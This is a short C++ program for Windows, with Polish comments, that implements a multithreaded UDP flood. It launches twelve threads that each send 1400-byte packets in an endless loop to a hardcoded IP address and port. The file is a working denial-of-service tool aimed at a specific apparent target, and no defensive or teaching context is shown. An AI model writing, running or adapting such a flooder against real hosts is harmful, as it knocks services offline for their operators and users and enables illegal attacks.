#include <iostream>
#include <winsock2.h> // Dla Windows (linkuj z ws2_32.lib)
#include <vector>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

void flood(const char* ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(ip);

    char payload[1400];
    memset(payload, 'X', 1400);

    while (true) {
        // C++ wysyła pakiety tak szybko, jak pozwala na to sprzęt
        sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&target, sizeof(target));
    }
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    const char* target_ip = "109.245.132.11";
    int target_port = 16000;
    int threads_num = 12; // Wykorzystujemy moc Twojego Ryzena

    std::vector<std::thread> threads;
    for (int i = 0; i < threads_num; ++i) {
        threads.push_back(std::thread(flood, target_ip, target_port));
    }

    for (auto& t : threads) t.join();
    WSACleanup();
    return 0;
}
